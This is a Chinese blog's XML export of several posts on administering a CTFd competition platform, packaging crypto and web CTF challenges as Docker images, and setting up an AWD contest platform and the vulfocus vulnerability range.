      <tags>
        <tag>比赛复现</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFd运维指南</title>
    <url>/2021/10/05/CTFd%E8%BF%90%E7%BB%B4%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<h1 id="如何运维CTFd"><a href="#如何运维CTFd" class="headerlink" title="如何运维CTFd"></a>如何运维CTFd</h1><p>简单的总结并分享一下CTFd 3.4.0版本的运维。</p>
<span id="more"></span>
<p><img src="https://i.loli.net/2021/10/05/FfgzivcqAC64OU3.png" alt="image-20211005134919356"></p>
<p>进入管理员页面，大概是这样一个总览图。接下来我会介绍一下每个模块的功能。</p>
<h2 id="Statistics"><a href="#Statistics" class="headerlink" title="Statistics"></a>Statistics</h2><p>一个统计页面，过。</p>
<h2 id="Notifications"><a href="#Notifications" class="headerlink" title="Notifications"></a>Notifications</h2><p>通知页面，没玩过，无非就是发些通知、公告类，影响不大，过。</p>
<h2 id="Pages"><a href="#Pages" class="headerlink" title="Pages"></a>Pages</h2><p>页面功能，就是给网站加页面，自定义路由和路由名字。</p>
<p><img src="https://i.loli.net/2021/10/05/qkQOGrdWeJPCaN3.png" alt="image-20211005135405456"></p>
<p>没什么花里胡哨的，都是字面意思。Authentication Required选项是需要登录后才可查看的意思。</p>
<h2 id="Users"><a href="#Users" class="headerlink" title="Users"></a>Users</h2><p><img src="https://i.loli.net/2021/10/05/erAlTybiufHhmQW.png" alt="image-20211005135756947"></p>
<p>都看得懂的吧，编辑权限、状态、修改信息等功能。注意，管理员账号权限非常高，可以任意修改他人（包括其他管理员的权限），也可以自己把自己号删了，使用时建议管理员越少越好。</p>
<p>还可以看到每个人的正确、错误提交，未解题、登录IP地址（较准确）、个人统计等数据。</p>
<h2 id="Scoreboard"><a href="#Scoreboard" class="headerlink" title="Scoreboard"></a>Scoreboard</h2><p>积分榜，没什么好多说的。</p>
<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><p>挑战模块，最常用的模块，只讲解dynamic_docker部分。ICPC的ACM插件自行探索吧。</p>
<p>首先是categories分类，也就是体现在主页上的内容。pages主题会自动识别这个框里的<code>.</code>符号，实现二级标题。</p>
<p>然后是docker image，写你上传在docker上的镜像，就是docker pull后面的内容。</p>
<p>Frp Redirect Type，有域名会配置解析写HTTP，不会老老实实用direct。</p>
<p>Frp Redirect Port，你dockerfile里暴露的哪个端口，就写映射哪个端口。</p>
<p>下面两个不要动。静态分数和动态分数。</p>
<p>动态分数的曲线公式写出来估计你们也看不懂，所以我写了个实现函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Cal</span>(<span class="params">max_point,min_point,solve_threshold,x</span>):</span></span><br><span class="line">	a = max_point</span><br><span class="line">	b = min_point</span><br><span class="line">	s = solve_threshold</span><br><span class="line">	<span class="keyword">if</span> x&gt;=s:</span><br><span class="line">		<span class="keyword">return</span> b</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		results = ((b-a)*x*x)/(s*s)+a </span><br><span class="line">		<span class="keyword">return</span> results</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">	<span class="built_in">print</span>(Cal(<span class="number">100</span>,<span class="number">20</span>,<span class="number">5</span>,i))</span><br><span class="line">    </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">100.0</span></span><br><span class="line"><span class="string">96.8</span></span><br><span class="line"><span class="string">87.2</span></span><br><span class="line"><span class="string">71.2</span></span><br><span class="line"><span class="string">48.8</span></span><br><span class="line"><span class="string">20.0</span></span><br><span class="line"><span class="string">20</span></span><br><span class="line"><span class="string">20</span></span><br><span class="line"><span class="string">20</span></span><br><span class="line"><span class="string">20</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>需要4个参数，最高分、最低分、一个固定常数s、解题人数x</p>
<p>程序很简单，都能看懂，不解释。</p>
<h2 id="Submissions"><a href="#Submissions" class="headerlink" title="Submissions"></a>Submissions</h2><p>记录了所有人所有题目的正确提交和错误提交。</p>
<h2 id="config"><a href="#config" class="headerlink" title="config"></a>config</h2><p>这个是个人能用翻译的都看得懂了，基础设置。</p>
<p>security是邀请码，写了以后，注册要填邀请码。</p>
<p>backup备份，建议定期备份站的数据。也可以导入数据，做平台迁移。注意导入后要坚持whale和一些其他设置的信息。每个平台都有自己的架构。</p>
<h2 id="whale"><a href="#whale" class="headerlink" title="whale"></a>whale</h2><p>ctfd的动态靶机插件，Direct IP Address不懂的写自己真实ip，这个没法教，自己搭一遍平台就懂了。否则说也说不清楚。</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>开发、导入插件等自定义功能请自行探索。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/frankli0324/ctfd-whale">CTF3.0版本CTFd-whale</a></p>
<p><a href="https://github.com/frankli0324/ctfd-pages-theme">pages主题</a></p>
<p><a href="https://www.zhaoj.in/read-6333.html">赵总官方教程</a></p>
<p>搭建可以参考我的博客（旧版2.3.2），以及vaalacat和frankli0324的教程（新版）</p>
<h2 id="寄语"><a href="#寄语" class="headerlink" title="寄语"></a>寄语</h2><p>当我写下这篇文档时，恐怕我不会再对这个我早8晚1肝了2个月的平台做进一步维护了。希望它能成为结合课堂教学、日常练习、训练赛等各项功能于一体的综合性训练平台。同时，我的个人dockerhub仓库很有可能不再更新，也不再会代表Rainbow7战队参加比赛。不过，这并不意味着我的网安之路的结束，我认为这更像是一场全新的开始。我依然有可能参与一些线上比赛，也有可能和其他志同道合的朋友一起去玩玩更多的东西。只是对我来说，CTF将不再是我的全部。</p>
<p>留下一点期待。</p>
<p>希望后辈有人能设计出n机frp转发模式，这样可以大幅降低平台压力。1核2G配置极限应该只够20人同时使用。虽然根据概率论的原理来计算，35个活跃用户同时开启10台及以上的靶机的概率≈0.0004，但是，这样的训练平台肯定无法满足比赛需求。</p>
<p>以及开发<code>v1/api</code>插件，只使用<code>go-cqhttp</code>即可做出ctfshow和大牛的播报效果。</p>
<p>根据<code>onebot</code>机器人协议，可以开发出更多带有意思的功能的qqbot，推荐使用nonebot2 。</p>
<p>还有内网穿透，公网访问内网服务器地址，尤其适用于博客。</p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>CTFd运维</tag>
      </tags>
  </entry>
  <entry>
    <title>英语单词每日打卡</title>
    <url>/2021/10/04/%E8%8B%B1%E8%AF%AD%E5%8D%95%E8%AF%8D%E6%AF%8F%E6%97%A5%E6%89%93%E5%8D%A1/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 密码不对呢，为什么不去社工管理员呢？" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="23ae82a6e7fcb832f50e133352177c10b3f247fc73748f831b3bbcd36bfbe65f"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好,接下来的内容需要密码才能阅览。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>基础课程学习</category>
      </categories>
      <tags>
        <tag>英语</tag>
      </tags>
  </entry>
  <entry>
    <title>如何用docker出一道ctf题(crypto)</title>
    <url>/2021/09/30/%E5%A6%82%E4%BD%95%E7%94%A8docker%E5%87%BA%E4%B8%80%E9%81%93ctf%E9%A2%98-crypto/</url>
    <content><![CDATA[<h1 id="如何用docker出一道ctf题-crypto"><a href="#如何用docker出一道ctf题-crypto" class="headerlink" title="如何用docker出一道ctf题(crypto)"></a>如何用docker出一道ctf题(crypto)</h1><p>目前docker的使用越来越宽泛，ctfd也支持从dockerhub一键拉题了。因此，学习如何使用docker出ctf题是非常必要的。</p>
<span id="more"></span>
<h2 id="python3篇"><a href="#python3篇" class="headerlink" title="python3篇"></a>python3篇</h2><p>在介绍python2篇和python3篇之前，首先需要对raw_input和input这两个函数做一个讲解。引用<a href="https://www.runoob.com/python/python-func-raw_input.html">菜鸟教程</a>。</p>
<blockquote>
<p>注意：input() 和 raw_input() 这两个函数均能接收 字符串 ，但 raw_input()  直接读取控制台的输入（任何类型的输入它都可以接收）。而对于 input() ，它希望能够读取一个合法的 python  表达式，即你输入字符串的时候必须使用引号将它括起来，否则它会引发一个 SyntaxError 。</p>
<p>除非对 input() 有特别需要，否则一般情况下我们都是推荐使用 raw_input() 来与用户交互。</p>
<p>注意：python3 里 input() 默认接收到的是 str 类型。</p>
</blockquote>
<p>因此，在python3环境下出题，输入端要填input()。</p>
<p>和web篇一样，我们以一道完整的题来演示一下。题目为sha256碰撞。</p>
<h3 id="sha256-py"><a href="#sha256-py" class="headerlink" title="sha256.py"></a>sha256.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">BUFSIZE = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c0</span>():</span></span><br><span class="line">    random.seed(os.urandom(<span class="number">128</span>))</span><br><span class="line">    alphabet = string.ascii_letters+string.digits</span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join(random.choices(alphabet, k=<span class="number">16</span>))</span><br><span class="line">    hash_value = hashlib.sha256(proof.encode(<span class="string">&#x27;ascii&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;???&#x27;</span>+<span class="string">&#x27;+&#x27;</span>+proof[<span class="number">3</span>:])</span><br><span class="line">    <span class="built_in">print</span>(hash_value)</span><br><span class="line">    buf = <span class="built_in">input</span>(BUFSIZE).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    tmp = buf+proof[<span class="number">3</span>:]</span><br><span class="line">    <span class="keyword">if</span> hashlib.sha256(tmp.encode(<span class="string">&#x27;ascii&#x27;</span>)).hexdigest() == hash_value:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;proof completed\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;bye~&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">win</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;Flag not Found...&#x27;</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        c0 = c0()</span><br><span class="line">        <span class="keyword">if</span> c0 == <span class="number">1</span>:</span><br><span class="line">            win()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>先是一波经典偷懒，直接拿了<code>ctftraining</code>的<code>copperstudy2.py</code>进行修改，改除了这道题目。由于答案在环境变量里，可以采用<code>print(os.environ.get(&#39;FLAG&#39;))</code>这种方法，但是我个人更喜欢<code>from flag import flag</code>这种方法，区别不大，主要就是知道如何从系统环境变量中拿flag就行。</p>
<p>然后看Dockerfile，更简单。</p>
<h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ctfhub/base_misc_socat_python_36</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> sha256.py /app/sha256.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">MAINTAINER</span> mapleice &lt;https://liuxin2020.github.io&gt;</span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> socat TCP4-LISTEN:10000,tcpwrap=script,reuseaddr,fork EXEC:<span class="string">&quot;/usr/bin/env python3 -u /app/sha256.py&quot;</span></span></span><br></pre></td></tr></table></figure>
<p>做成镜像传上去就行了。</p>
<p>其他记得注意填写<code>requirements.txt</code></p>
<h2 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h2><p>有空回来更。注意使用<code>raw_input</code></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>ctf出题指南</tag>
      </tags>
  </entry>
  <entry>
    <title>如何用docker出一道ctf题(web)</title>
    <url>/2021/09/28/%E5%A6%82%E4%BD%95%E7%94%A8docker%E5%87%BA%E4%B8%80%E9%81%93ctf%E9%A2%98(web)/</url>
    <content><![CDATA[<h1 id="如何用docker出一道ctf题-web"><a href="#如何用docker出一道ctf题-web" class="headerlink" title="如何用docker出一道ctf题(web)"></a>如何用docker出一道ctf题(web)</h1><p>目前docker的使用越来越宽泛，ctfd也支持从dockerhub一键拉题了。因此，学习如何使用docker出ctf题是非常必要的。</p>
<span id="more"></span>
<h2 id="安装docker和docker-compose"><a href="#安装docker和docker-compose" class="headerlink" title="安装docker和docker-compose"></a>安装docker和docker-compose</h2><p>100种方法，写个最简单的。之前一篇文章CTFD部署里我也提到过如何安装。</p>
<h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com -o get-docker.sh</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh get-docker.sh --mirror Aliyun</span><br></pre></td></tr></table></figure>
<h3 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install python3-pip -y</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install docker-compose</span><br></pre></td></tr></table></figure>
<h2 id="无数据库篇"><a href="#无数据库篇" class="headerlink" title="无数据库篇"></a>无数据库篇</h2><p>这个比较简单，先挂一下tree。</p>
<p><img src="https://i.loli.net/2021/09/28/uqStyEBAihHYGU1.png" alt="image-20210928171223267"></p>
<p>我本人习惯在windows下出题，主要是因为方便。<del>实际上是因为我虚拟机里一堆bug</del>。</p>
<p>接下来我们一层一层解析。</p>
<h3 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;1234&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>先从最底层<code>html</code>文件夹内的内容说起。这里面就放题目和<code>flag.php</code>即可，flag如果在根目录的情况我会另外标注(在flag.sh中改)。</p>
<h3 id="flag-sh"><a href="#flag-sh" class="headerlink" title="flag.sh"></a>flag.sh</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">sed -i <span class="string">&quot;s/flag&#123;1234&#125;/<span class="variable">$FLAG</span>/&quot;</span> /var/www/html/flag.php</span><br><span class="line"><span class="built_in">export</span> FLAG=not_flag</span><br><span class="line">FLAG=not_flag</span><br><span class="line"></span><br><span class="line">rm -f /flag.sh</span><br></pre></td></tr></table></figure>
<p>ctfd-whale会自动生成一个随机flag的变量在$FLAG里。</p>
<p>第二行就是将你存储flag的位置，做个替换，3,4行清空环境变量值，否则执行<code>echo $FLAG</code>就能直接出flag。</p>
<p>如果要把flag放入根目录/flag，把第二行改成：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$FLAG</span> &gt;&gt; /flag</span><br></pre></td></tr></table></figure>
<h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请务必保证该出能从 hub.docker.com 上拉取下来。</span></span><br><span class="line"><span class="comment"># 尽量使用能在 hub.docker.com 上查看到 Dockerfile，下载量高的官方认证镜像，推荐使用 https://github.com/DASCTF.</span></span><br><span class="line"><span class="keyword">FROM</span> ctftraining/base_image_nginx_php_73</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝源码到相应目录下。</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> src /var/www</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如需自定义 FLAG 请将自定义脚本覆盖到 /flag.sh</span></span><br><span class="line"><span class="comment"># COPY files/flag.sh /flag.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如需操作数据库请将 sql 文件拷贝到 /db.sql</span></span><br><span class="line"><span class="comment"># COPY files/db.sql /db.sql</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如有上传文件等操作请务必将权限设置正确！</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chown -R www-data:www-data /var/www/html/ &amp;&amp; \</span></span><br><span class="line"><span class="bash">    mv /var/www/flag.sh / &amp;&amp; \</span></span><br><span class="line"><span class="bash">    chmod +x /flag.sh &amp;&amp; \</span></span><br><span class="line"><span class="bash">    dos2unix /flag.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如需静态 FLAG 请在此利用环境变量声明</span></span><br><span class="line"><span class="comment"># ENV DASFLAG=DASCTF&#123;flag_test&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 请声明对外暴露端口</span></span><br><span class="line"><span class="comment"># EXPOSE 80</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>直接用集成镜像了，太猛了。这个镜像不需要暴露端口。DASCTF的镜像需要暴露端口。相关源码可以去github上搜ctftraining去看。</p>
<p>注意第18行<code>dos2unix /flag.sh</code>，个人习惯在windows上出题，写的shell脚本的换行符在linux系统中会炸，因此需要执行该命令。当然也可以使用编辑器，例如notepad++或sublime text中设置文件为unix格式。</p>
<h2 id="有数据库篇"><a href="#有数据库篇" class="headerlink" title="有数据库篇"></a>有数据库篇</h2><p>正在学习，玩不明白数据库，蕾姆。之后看情况更新密码nc题出题方法。</p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>ctf出题指南</tag>
      </tags>
  </entry>
  <entry>
    <title>基于AWD-platform的AWD环境搭建</title>
    <url>/2021/09/27/%E5%9F%BA%E4%BA%8EAWD-platform%E7%9A%84AWD%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="基于AWD-platform的AWD环境搭建"><a href="#基于AWD-platform的AWD环境搭建" class="headerlink" title="基于AWD-platform的AWD环境搭建"></a>基于AWD-platform的AWD环境搭建</h1><p>用zhl2008大佬的平台搭了个AWD平台，下面记录搭建过程和运维指南。</p>
<span id="more"></span>
<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247486325&amp;idx=1&amp;sn=96c04f3609a04260eabdd187fc7c38b1&amp;chksm=fbf79105cc8018131579ad228dbf22a33bbdf0c8c71d3b8c090583b42ea21d80de53fc1efa70&amp;scene=27&amp;key=593393174013ce6d958e86eb764289b105cb7cea44d471bd3f9fe1a2ed76f546343dacb9b40a352e642e425b55c2a4d9698146a114ecd9680ed3262c8f96f6a206f0c78d6818ce0028c9bc75830936f0&amp;ascene=7&amp;uin=NTQ5ODg5NzY1&amp;devicetype=Windows+10&amp;version=6206061c&amp;lang=zh_CN&amp;pass_ticket=s3n8uD0SG7m1vojw%2F%2BN7uxdrTxvWnumzuUe%2BTLY12QY9yFKjU7n%2FNruWi9PS1sJO&amp;winzoom=1">夜莫离大佬的教程</a></p>
<p><a href="https://blog.csdn.net/huanghelouzi/article/details/90204325">搭建CTF-AWD训练平台</a></p>
<p><a href="https://www.moonsec.com/archives/2980">暗月博客搭建AWD平台</a></p>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://gitee.com/jikemofan/awd-platform</span><br></pre></td></tr></table></figure>
<p>原版有无限提交flag的bug，我用的暗月的版本，主要bug均已经修复。（但是有新的bug，比如说他写的提交flag功能是个摆设）</p>
<p>进入项目：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd awd-platform/</span><br></pre></td></tr></table></figure>
<p>从网上拉取一下zhl2008的docker镜像：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull zhl2008&#x2F;web_14.04</span><br></pre></td></tr></table></figure>
<p>然后要改名！大坑。不改名就去改dockerfile</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker tag zhl2008&#x2F;web_14.04 web_14.04</span><br></pre></td></tr></table></figure>
<p>至此，awd平台已经安装完毕。但是，要安装python2，先更新源：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure>
<p>然后装python2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install python2</span><br></pre></td></tr></table></figure>
<h2 id="比赛环境介绍"><a href="#比赛环境介绍" class="headerlink" title="比赛环境介绍"></a>比赛环境介绍</h2><p>服务器全部以docker形式部署在同一台虚拟机上。</p>
<p>Check_server:</p>
<p>服务检查服务器，用于判定选手维护的服务是否可用，如果不可用，则会扣除相应的分数。不开启任何端口。需要与flag服务器通信。</p>
<p>Flag_server:</p>
<p>选手提交flag的服务器，并存储选手的分数。开启80端口。</p>
<p>Web_server:</p>
<p>选手连接的服务器，选手需要对其进行维护，并尝试攻击其他队伍的机器。通常开启80端口，22端口，并将端口映射到主机。</p>
<h2 id="比赛逻辑拓扑"><a href="#比赛逻辑拓扑" class="headerlink" title="比赛逻辑拓扑"></a>比赛逻辑拓扑</h2><p><img src="https://i.loli.net/2021/09/27/nGrJePfA3XVLFgl.png" alt="7-1"></p>
<h2 id="比赛启动"><a href="#比赛启动" class="headerlink" title="比赛启动"></a>比赛启动</h2><p>例如我要创建5支队伍，赛题使用<code>web_yunnan_simple</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python2 batch.py web_yunnan_simple 5</span><br></pre></td></tr></table></figure>
<p>启动比赛：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python2 start.py ./ 5</span><br></pre></td></tr></table></figure>
<p>此时可以访问8080端口看到计分板。靶机也可以正常访问。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">映射规则:</span><br><span class="line">站的位置:</span><br><span class="line">team1 ---- 8801</span><br><span class="line">team2 ---- 8802</span><br><span class="line">team3 ---- 8803</span><br><span class="line">SSH位置:</span><br><span class="line">team1 ---- 2201</span><br><span class="line">team2 ---- 2202</span><br><span class="line">team3 ---- 2203</span><br></pre></td></tr></table></figure>
<p>各队伍的ssh密码在pass.txt中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat pass.txt</span><br></pre></td></tr></table></figure>
<p>关于check模块，他的check脚本是不能用的，我们需要进行一些修改，这个规则要根据自己的环镜自己编写，总体思路就是判断页面是否存在，存在就加一分，不存在就减一分，在他内置check脚本的基础上，我们可以稍微修改一下靶机环境的源码，然后用check脚本去访问，在他内置的脚本中还可以修改每次加分和扣分的多少。</p>
<p><img src="https://i.loli.net/2021/09/27/CyfMQIl7Sab8qci.png" alt="image-20210927210321320"></p>
<p>还有一个要注意的地方就是，在项目的根目录的flag_server/中，我们 要赋予score.txt 和result.txt 777权限，否则分数变动无法进行同步。</p>
<p>关闭环境和题目：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 stop_clean.py</span><br></pre></td></tr></table></figure>
<h2 id="比赛参数"><a href="#比赛参数" class="headerlink" title="比赛参数"></a>比赛参数</h2><p>Flag 提交： /flag_file.php?token=teamx&amp;flag=xxxx (x为你们的队伍号)</p>
<h2 id="比赛规则"><a href="#比赛规则" class="headerlink" title="比赛规则"></a>比赛规则</h2><p>1.每个队伍分配到一个docker主机，给定ctf用户权限，通过制定的端口和密码进行连接；</p>
<p>2.每台docker主机上运行一个web服务或者其他的服务，需要选手保证其可用性，并尝试审计代码，攻击其他队伍；</p>
<p>3.比赛开始后，<strong>前30分钟</strong>，选手维护各自的主机，在这个阶段，所有的攻击和服务不可用不影响分数；</p>
<p>4.选手可以通过使用漏洞获取其他队伍的服务器的权限，读取他人服务器上的flag并提交到指定的flag服务器：</p>
<p><a href="http://flag服务器IP:端口/flag_file.php?token=队伍token&amp;flag=获取到的flag">http://flag服务器IP:端口/flag_file.php?token=队伍token&amp;flag=获取到的flag</a>   来获得相应的分数。</p>
<p>例如：flag server地址为8.8.8.8，端口为8080，队伍token为team1，flag为40ed892b93997142e46124516d0f5ac0，则请求/flag_file.php?token=team1&amp;flag=40ed892b93997142e46124516d0f5ac0来获得相应分数。</p>
<p>每次成功攻击可获得<strong>2</strong>分，被攻击者扣除2分；<strong>有效攻击两分钟一轮</strong>；</p>
<p>5.选手需要保证己方服务的可用性，每次服务不可用，扣除1分,服务可用，加1分；<strong>服务检测两分钟一轮</strong>；</p>
<p>6.选手可以从flag服务器上获取所有的攻击情况以及当前的分数：</p>
<p>攻击情况url地址：<a href="http://flag服务器IP:端口/result.txt">http://flag服务器IP:端口/result.txt</a></p>
<p>得分情况地址：<a href="http://flag服务器IP:端口/score.txt">http://flag服务器IP:端口/score.txt</a></p>
<p>7.<strong>不允许使用任何形式的DOS攻击</strong></p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>比赛节奏巨快，2分钟一轮。要修改的话可以看看这个（但我没有成功）</p>
<p><img src="https://i.loli.net/2021/09/27/nZEoyXMVL8duckT.png" alt="image-20210927210717817"></p>
<p>还有夜莫离大佬写的前端计分板。</p>
<p><img src="https://i.loli.net/2021/09/27/f6mapx42HyUhjzq.png" alt="image-20210927210806037"></p>
<p>计分板源码打包：<a href="https://pan.baidu.com/s/18KlIeluaTtm-kT3KuXHseQ">https://pan.baidu.com/s/18KlIeluaTtm-kT3KuXHseQ</a></p>
<p>提取码：cvdn</p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>AWD环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>vulfocus靶场搭建及bug处理</title>
    <url>/2021/09/27/vulforce%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E5%8F%8Abug%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<h1 id="vulfocus搭建"><a href="#vulfocus搭建" class="headerlink" title="vulfocus搭建"></a>vulfocus搭建</h1><p>想复现漏洞，但是漏洞复现需要大家一起交流一起学习，就想到搭一个漏洞复现靶场。</p>
<span id="more"></span>
<p>首先贴上<a href="https://fofapro.github.io/vulfocus/#/">官方链接</a>：</p>
<p>推荐采用快速安装。自定义安装极其繁琐，把握不住。</p>
<h2 id="安装流程："><a href="#安装流程：" class="headerlink" title="安装流程："></a>安装流程：</h2><h3 id="拉取镜像："><a href="#拉取镜像：" class="headerlink" title="拉取镜像："></a>拉取镜像：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull vulfocus&#x2F;vulfocus:latest</span><br></pre></td></tr></table></figure>
<h3 id="启动："><a href="#启动：" class="headerlink" title="启动："></a>启动：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 80:80 -v &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock  -e VUL_IP&#x3D;xxx.xxx.xxx.xxx&quot; vulfocus&#x2F;vulfocus</span><br></pre></td></tr></table></figure>
<p>因为内网使用，就不开邮箱权限了。</p>
<p>贴上官网教程。</p>
<p><img src="https://i.loli.net/2021/09/27/wjPb7LlG12ApcO4.png" alt="image-20210927200624470"></p>
<h2 id="bug处理"><a href="#bug处理" class="headerlink" title="bug处理"></a>bug处理</h2><h3 id="1、服务器内部异常，请联系管理员"><a href="#1、服务器内部异常，请联系管理员" class="headerlink" title="1、服务器内部异常，请联系管理员"></a>1、服务器内部异常，请联系管理员</h3><p>巨大bug，在拉取镜像后，点击首页会报这个错误，解决方式为进入镜像管理，点击右上角一键同步，即可。</p>
